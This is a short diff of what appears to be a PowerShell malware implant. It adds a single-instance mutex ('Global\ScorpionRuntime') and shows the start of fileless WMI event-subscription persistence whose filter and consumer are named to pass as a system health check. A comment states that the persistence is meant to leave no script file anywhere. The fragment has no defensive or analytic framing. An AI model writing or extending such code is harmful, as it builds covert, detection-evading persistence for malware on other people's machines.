@@ -10,6 +10,11 @@ $NS       = 'root\subscription'
 $Filter   = 'SystemHealthCheck'
 $Consumer = 'SystemHealthMonitor'
 
+# Only one runtime instance at a time (WMI trigger + logon watcher can overlap).
+$created = $false
+$global:ScorpionMutex = New-Object System.Threading.Mutex($true, 'Global\ScorpionRuntime', [ref]$created)
+if (-not $created) { return }
+
 # -- WMI-only persistence (no script file anywhere) --------------------------
 # WMI can hold half-written objects after a failed run. Clear first, create clean.
 function Install-Persistence {
